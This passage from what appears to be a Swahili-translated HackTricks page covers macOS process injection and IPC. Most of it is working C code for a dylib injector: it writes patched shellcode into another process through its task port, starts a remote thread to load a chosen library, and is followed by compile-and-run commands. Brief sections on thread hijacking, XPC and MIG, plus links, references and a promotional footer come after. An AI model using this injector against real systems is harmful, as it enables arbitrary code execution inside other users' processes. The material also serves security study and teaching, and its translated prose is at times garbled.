kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```markdown
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>  
### Maelezo ya Mawasiliano kati ya Michakato (IPC) kwenye macOS

Kwenye mifumo ya macOS, mawasiliano kati ya michakato hufanyika kupitia njia mbalimbali za IPC kama vile machapisho ya ujumbe, mizunguko ya ujumbe, na mizunguko ya ujumbe wa XPC. Kuelewa jinsi mifumo hii ya IPC inavyofanya kazi ni muhimu katika kubaini na kuzuia mashambulizi ya kuvuka mipaka na kufikia rasilimali za mfumo zilizolindwa.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Utekaji wa Thread kupitia Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Katika mbinu hii, thread ya mchakato inatekwa:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Taarifa Msingi

XPC, ambayo inasimama kwa XNU (kernel inayotumiwa na macOS) Mawasiliano kati ya Michakato, ni mfumo wa **mawasiliano kati ya michakato** kwenye macOS na iOS. XPC hutoa njia ya kufanya **wito salama, asinkroni kati ya michakato tofauti** kwenye mfumo. Ni sehemu ya mfumo wa usalama wa Apple, kuruhusu **ujenzi wa programu zilizotenganishwa kwa mamlaka** ambapo kila **sehemu** inaendeshwa na **ruhusa inayohitajika** kufanya kazi yake, hivyo kupunguza uharibifu unaoweza kutokea kutokana na mchakato uliokumbwa na shida.

Kwa maelezo zaidi kuhusu jinsi hii **mawasiliano inavyofanya kazi** au jinsi inavyoweza kuwa **dhaifu**, angalia:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG ilianzishwa ili **kurahisisha mchakato wa uundaji wa kanuni za Mach IPC**. Kimsingi **inazalisha kanuni zinazohitajika** kwa seva na mteja kuwasiliana kulingana na ufafanuzi uliopewa. Hata kama kanuni iliyozalishwa ni mbaya, mwandishi wa programu atahitaji tu kuagiza hiyo na kanuni yake itakuwa rahisi sana kuliko hapo awali.

Kwa maelezo zaidi angalia:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Marejeo

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
